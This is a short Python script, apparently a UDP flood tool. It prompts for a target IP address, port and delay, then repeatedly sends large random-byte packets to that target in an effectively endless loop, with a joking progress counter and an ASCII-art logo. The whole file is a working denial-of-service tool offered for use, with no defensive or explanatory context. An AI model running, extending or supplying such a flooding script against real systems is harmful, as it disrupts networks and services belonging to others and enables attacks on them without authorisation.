import socket, random, time
import art

logo = art.logo
try:
    #Create a Socket:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    print(logo)
    #define target IP and Port
    ip = input("What is the target IP: ")
    port = int(input("What is the target port: "))
    #Set time between each send
    sleep = float(input("Sleep: "))

    #assemble the walla
    s.connect((ip, port))

    for i in range(1, 100**1000):
        s.send(random._urandom(10)*1000)
        print(f"One little two little {i} little walla's", end='\r')
        time.sleep(sleep)

except KeyboardInterrupt:
    print("\nThe walla have dissassmbled, Program exiting...") 
